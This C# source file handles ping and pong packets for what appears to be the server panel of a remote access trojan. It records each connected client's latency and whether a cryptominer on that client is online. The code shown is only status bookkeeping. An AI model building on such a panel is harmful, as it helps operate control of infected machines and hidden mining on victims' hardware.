﻿using Server.MessagePack;
using Server.Connection;
using System.Diagnostics;
using System.Windows.Forms;
using System.Threading;
using System.Drawing;

namespace Server.Handle_Packet
{
    public class HandlePing
    {
        public void Ping(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").SetAsString("pong");
                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                lock (Settings.LockListviewClients)
                    if (client.LV != null)
                        client.LV.SubItems[Program.form1.lv_prefor.Index].Text = unpack_msgpack.ForcePathObject("Message").AsString.Replace("MINER 0", "MINER Offline").Replace("MINER 1", "MINER Online");
                    else
                        Debug.WriteLine("Temp socket pinged server");
            }
            catch { }
        }

        public void Pong(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                lock (Settings.LockListviewClients)
                    if (client.LV != null)
                    {
                        client.LV.SubItems[Program.form1.lv_ping.Index].Text = unpack_msgpack.ForcePathObject("Message").AsInteger.ToString() + " MS";
                        if (unpack_msgpack.ForcePathObject("Message").AsInteger > 600)
                        {
                            client.LV.SubItems[Program.form1.lv_ping.Index].ForeColor = Color.Red;
                        }
                        else if (unpack_msgpack.ForcePathObject("Message").AsInteger > 300)
                        {
                            client.LV.SubItems[Program.form1.lv_ping.Index].ForeColor = Color.Orange;
                        }
                        else
                        {
                            client.LV.SubItems[Program.form1.lv_ping.Index].ForeColor = Color.Green;
                        }
                    }

            }
            catch { }
        }
    }
}